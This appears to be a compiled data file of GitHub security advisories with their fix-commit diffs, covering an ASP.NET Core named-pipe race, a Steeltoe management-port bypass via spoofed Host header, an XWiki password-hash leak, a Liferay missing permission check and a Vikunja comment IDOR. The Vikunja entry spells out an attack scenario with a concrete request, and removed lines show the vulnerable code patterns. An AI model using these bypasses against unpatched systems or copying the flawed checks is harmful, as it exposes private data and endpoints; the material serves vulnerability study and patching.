+    -                // Dispose existing pipe, create a new one and continue accepting.
+    -                nextStream.Dispose();
+    -                nextStream = _namedPipeServerStreamPool.Get();
+    +                // Create a new pipe and continue accepting. We create the new one before disposing
+    +                // the broken one to ensure there is always a created stream and another process
+    +                // can't create a stream with the same name with a different access policy.
+    +                var brokenStream = nextStream;
+    +                try
+    +                {
+    +                    nextStream = _namedPipeServerStreamPool.Get();
+    +                }
+    +                finally
+    +                {
+    +                    brokenStream.Dispose();
+    +                }
+FIX commit https://github.com/dotnet/aspnetcore/commit/a4ade6a6848f06681af1a57b5a7b555647d3e19d status=200
+  MSG: Merged PR 66393: [release/9.0] Update broken named pipe listener recovery path to prevent another process from using the same pipe name with a different access policy In the recovery path on IOExcepti
+  FILE src/Servers/Kestrel/Transport.NamedPipes/src/Internal/NamedPipeConnectionListener.cs
+    -                // Dispose existing pipe, create a new one and continue accepting.
+    -                nextStream.Dispose();
+    -                nextStream = _namedPipeServerStreamPool.Get();
+    +                // Create a new pipe and continue accepting. We create the new one before disposing
+    +                // the broken one to ensure there is always a created stream and another process
+    +                // can't create a stream with the same name with a different access policy.
+    +                var brokenStream = nextStream;
+    +                try
+    +                {
+    +                    nextStream = _namedPipeServerStreamPool.Get();
+    +                }
+    +                finally
+    +                {
+    +                    brokenStream.Dispose();
+    +                }
+
+=== GHSA-58f6-6rj2-3v8r sev=high pkgs=['nuget:Steeltoe.Management.Endpoint', 'nuget:Steeltoe.Management.EndpointCore']
+src=https://github.com/SteeltoeOSS/steeltoe cwes=['CWE-288', 'CWE-639']
+SUMMARY: Steeltoe vulnerable to management-port isolation bypass via spoofed Host header
+DESC: ### Summary When Steeltoe management endpoints are configured to listen on an alternate port (`Management:Endpoints:Port` is configured), the middleware responsible for restricting access to the endpoints uses the `Host` HTTP header rather than the actual network socket port. ### Impact An unauthenticated remote attacker can reach every actuator endpoint using a specially crafted HTTP request. ### Affected configuration - The application's public port is accessible over from the network. - `Management:Endpoints:Port` is configured to a value different from the application's main listener port. - The request scheme matches `Management:Endpoints:SslEnabled`. For example, `http` when `SslEnabled` is `false` (the default), or `https` when `SslEnabled` is `true`. ### Mitigations If an immediate upgrade to a patched version is not possible: - Add explicit ASP.NET Core authorization (`RequireAuthorization`) to all sensitive actuator endpoints as a defense-in-depth measure independent of port isolation. - Configure the reverse proxy or load balancer to enforce the `Host` header value and prevent clients from setting an arbitrary port.
+FIX commit https://github.com/SteeltoeOSS/Steeltoe/commit/4cbc352fe89ac2e6c609554e435ab28996fec5e9 status=200
+  MSG: Fix management port isolation bypass * Use HttpContext.Connection.LocalPort when evaluating management port
+  FILE src/Management/src/EndpointCore/ManagementPort/ManagementPortMiddleware.cs
+    -            allowRequest = allowRequest || (context.Request.Host.Port.ToString() == _managementOptions.Port && isManagementPath);
+    -            allowRequest = allowRequest || (context.Request.Host.Port.ToString() != _managementOptions.Port && !isManagementPath);
+    +            allowRequest = allowRequest || (context.Connection.LocalPort.ToString() == _managementOptions.Port && isManagementPath);
+    +            allowRequest = allowRequest || (context.Connection.LocalPort.ToString() != _managementOptions.Port && !isManagementPath);
+    -            string errorMessage = $"Access denied to {context.Request.Path} on port {context.Request.Host.Port} since Management Port is set to {managementPort
+    +            string errorMessage = $"Access denied to {context.Request.Path} on port {context.Connection.LocalPort} since Management Port is set to {managementP
+  FILE src/Management/test/EndpointCore.Test/ManagementEndpointServedOndifferentPort.cs
+    +using FluentAssertions;
+    +    private class LocalPortStartupFilter : IStartupFilter
+    +    {
+    +        public Action<IApplicationBuilder> Configure(Action<IApplicationBuilder> next)
+    +        {
+    +            return app =>
+    +            {
+    +                app.Use(async (context, nextMiddleware) =>
+    +                {
+    +                    if (context.Connection.LocalPort == 0)
+    +                    {
+    +                        context.Connection.LocalPort = context.Request.Host.Port ?? 80;
+    +                    }
+    +                    await nextMiddleware();
+    +                });
+    +                next(app);
+    +            };
+    +        }
+    +    }
+    +        hostBuilder.Services.AddSingleton<IStartupFilter, LocalPortStartupFilter>();
+    +        hostBuilder.Services.AddSingleton<IStartupFilter, LocalPortStartupFilter>();
+    +        hostBuilder.Services.AddSingleton<IStartupFilter, LocalPortStartupFilter>();
+    +                webhostBuilder.ConfigureServices(svc => svc.AddSingleton<IStartupFilter, LocalPortStartupFilter>());
+    +            webhostBuilder.ConfigureServices(svc => svc.AddSingleton<IStartupFilter, LocalPortStartupFilter>());
+FIX commit https://github.com/SteeltoeOSS/Steeltoe/commit/b7ca93c510aaa08d7e4ebec40ce20c5811c2c4b6 status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-v782-xr4w-3vqx sev=medium pkgs=['maven:org.xwiki.platform:xwiki-platform-oldcore']
+src=https://github.com/xwiki/xwiki-platform cwes=['CWE-200', 'CWE-916']
+SUMMARY: XWiki Platform: Password hash might be leaked by diff once the xobject holding them is deleted
+DESC: ### Impact It is possible to access the hash of a password by using the diff feature of the history whenever the object storing the password is deleted. Using that vulnerability it's possible for an attacker to have access to the hash password of a user if they have rights to edit the users' page. Now with the default right scheme in XWiki this vulnerability is normally prevented on user profiles, except by users with Admin rights. Note that this vulnerability also impacts any extensions that might use passwords stored in xobjects: for those usecases it depends on the right of those pages. There is currently no way to be 100% sure that this vulnerability has been exploited, as an attacker with enough privilege could have deleted the revision where the xobject was deleted after rolling-back the deletion. But again, this operation requires high privileges on the target page (Admin right). A page with a user password xobject which have in its history a revision where the object has been deleted should be considered at risk and the password should be changed there. ### Patches The vulnerability has been patched in XWiki 14.10.19, 15.5.4 and 15.9-rc-1 by performing a better check before dislaying data of a diff, to ensure it's not coming from a password field. ### Workarounds Admins should ensure that the user pages are properly protected: the edit right shouldn't be allowed for other users than Admin and owner of the profile (which is the default right). Now there's not much workaround possible for a privileged user other than upgrading XWiki. ### References * JIRA ticket: https://jira.xwiki.org/browse/XWIKI-19948 * Commit: https://github.com/xwiki/xwiki-platform/commit/f1eaec1e512220fabd970d053c627e435a1652cf ### For more information If you have any questions or comments about this advisory: * Open an issue in [Jira XWiki.org](https://jira.xwiki.org/) * Email us at [Security Mailing List](mailto:security@xwiki.org)
+FIX commit https://github.com/xwiki/xwiki-platform/commit/9075668a4135cce114ef2a4b72eba3161a9e94c4 status=200
+  MSG: XWIKI-19948: Bad diff information when xobject is deleted (#2439) * Ensure to retrieve the xclass even when the xobject has been deleted * Ensure the BaseObject contains an XClass reference when creat
+  FILE xwiki-platform-core/xwiki-platform-oldcore/src/main/java/com/xpn/xwiki/doc/XWikiDocument.java
+    -                        dlist = new BaseObject().getDiff(originalObj, context);
+    +                        newObj = new BaseObject();
+    +                        // We want the xclass reference to be set so that it can resolve the xclass properties.
+    +                        newObj.setXClassReference(originalObj.getXClassReference());
+    +                        dlist = newObj.getDiff(originalObj, context);
+  FILE xwiki-platform-core/xwiki-platform-oldcore/src/main/java/com/xpn/xwiki/objects/BaseObject.java
+    +            // Bulletproofing: in theory the BaseObject is defined with a xclass reference allowing to resolve it
+    +            // however, it's possible that the reference is not set, in which case we might still find the info
+    +            // in the old object.
+    +            if (bclass == null) {
+    +                bclass = oldObject.getXClass(context);
+    +            }
+FIX commit https://github.com/xwiki/xwiki-platform/commit/955fb097e02a2a7153f527522ee9eef42447e5d7 status=200
+  (same commit message as a fix above; diff not repeated)
+FIX commit https://github.com/xwiki/xwiki-platform/commit/f1eaec1e512220fabd970d053c627e435a1652cf status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-v53g-736w-mgw4 sev=medium pkgs=['maven:com.liferay:com.liferay.organizations.item.selector.web']
+src=https://github.com/liferay/liferay-portal cwes=['CWE-862']
+SUMMARY: Liferay Portal's Organization Selector exposes organization data to remote authenticated users
+DESC: The Organization Selector in Liferay Portal 7.4.0 through 7.4.3.124, and Liferay DXP 2024.Q1.1 through 2024.Q1.12 and 7.4 update 81 through update 85 does not check user permission, which allows remote authenticated users to obtain a list of all organizations.
+FIX commit https://github.com/liferay/liferay-portal/commit/730b0840530e2fbd98d482c9f1a1f0f8391a2369 status=200
+  MSG: LPD-24824 copy implementation from admin organizations portlet
+  FILE modules/apps/organizations/organizations-item-selector-web/src/main/java/com/liferay/organizations/item/selector/web/internal/OrganizationItemSelectorView.java
+    -					_organizationLocalService, httpServletRequest, portletURL);
+    +					_organizationLocalService, httpServletRequest, _portal,
+    +					portletURL);
+  FILE modules/apps/organizations/organizations-item-selector-web/src/main/java/com/liferay/organizations/item/selector/web/internal/display/context/OrganizationItemSelectorViewDisplayContext.java
+    +import com.liferay.portal.kernel.security.permission.ActionKeys;
+    +import com.liferay.portal.kernel.security.permission.PermissionChecker;
+    +import com.liferay.portal.kernel.theme.ThemeDisplay;
+    +import com.liferay.portal.kernel.util.Portal;
+    +import com.liferay.portal.kernel.util.WebKeys;
+    +import java.util.LinkedHashMap;
+    -		HttpServletRequest httpServletRequest, PortletURL portletURL) {
+    +		HttpServletRequest httpServletRequest, Portal portal,
+    +		PortletURL portletURL) {
+    +		_portal = portal;
+    +		ThemeDisplay themeDisplay = (ThemeDisplay)_renderRequest.getAttribute(
+    +			WebKeys.THEME_DISPLAY);
+    +		PermissionChecker permissionChecker =
+    +			themeDisplay.getPermissionChecker();
+    +		LinkedHashMap<String, Object> params = new LinkedHashMap<>();
+    +		if (!permissionChecker.hasPermission(
+    +				null, Organization.class.getName(),
+    +				Organization.class.getName(), ActionKeys.VIEW)) {
+    +			params.put(
+    +				"organizationsTree",
+    +				_organizationLocalService.getUserOrganizations(
+    +					_portal.getUserId(_renderRequest), true));
+    +		}
+    -				organizationSearchTerms.getKeywords(), null, null, null, null,
+    +				organizationSearchTerms.getKeywords(), null, null, null, params,
+    -				organizationSearchTerms.getKeywords(), null, null, null, null));
+    +				organizationSearchTerms.getKeywords(), null, null, null,
+
+=== GHSA-mr3j-p26x-72x4 sev=medium pkgs=['go:code.vikunja.io/api']
+src=https://github.com/go-vikunja/vikunja cwes=['CWE-639']
+SUMMARY: Vikunja has an IDOR in Task Comments Allows Reading Arbitrary Comments
+DESC: An authenticated user can read any task comment by ID, regardless of whether they have access to the task the comment belongs to, by substituting the task ID in the API URL with a task they do have access to. ## Details The `GET /api/v1/tasks/{taskID}/comments/{commentID}` endpoint performs an authorization check against the task ID provided in the URL path, then loads the comment by its own ID without verifying it belongs to that task. ### Root Cause In `pkg/models/task_comment_permissions.go`, `CanRead` constructs a `Task` using the `TaskID` from the URL and checks `Task.CanRead`: ```go func (tc *TaskComment) CanRead(s *xorm.Session, a web.Auth) (bool, int, error) { t := Task{ID: tc.TaskID} return t.CanRead(s, a) } ``` In `pkg/models/task_comments.go`, `getTaskCommentSimple` loads the comment by ID only, with `NoAutoCondition()` explicitly disabling XORM's implicit struct-field filtering: ```go func getTaskCommentSimple(s *xorm.Session, tc *TaskComment) error { exists, err := s. Where("id = ?", tc.ID). NoAutoCondition(). Get(tc) // ... } ``` The generic web handler (`pkg/web/handler/read_one.go`) calls `CanRead` before `ReadOne`, so the permission check passes against the attacker-controlled task ID, and then `ReadOne` returns the comment from a completely different task. ### Attack Scenario 1. Attacker is authenticated and has read access to any task (task ID `A`) — e.g. their own task. 2. Attacker guesses or enumerates a comment ID (`C`) belonging to a task in another user's private project. 3. Attacker requests: `GET /api/v1/tasks/A/comments/C` 4. Authorization passes because the attacker can read task `A`. 5. The comment `C` is loaded by ID only and returned, leaking its contents and author. ## Credit This vulnerability was found using [GitHub Security Lab Taskflows](https://github.com/GitHubSecurityLab/seclab-taskflows).
+FIX commit https://github.com/go-vikunja/vikunja/commit/bc6d843ed4df82a6c89f10aa676a7a33d27bf2fd status=200
+  MSG: fix: verify comment belongs to task in URL to prevent IDOR Add task_id check to getTaskCommentSimple so that a comment can only be loaded if it actually belongs to the task specified in the URL. Previ
+  FILE pkg/models/task_comments.go
+    +		And("task_id = ?", tc.TaskID).
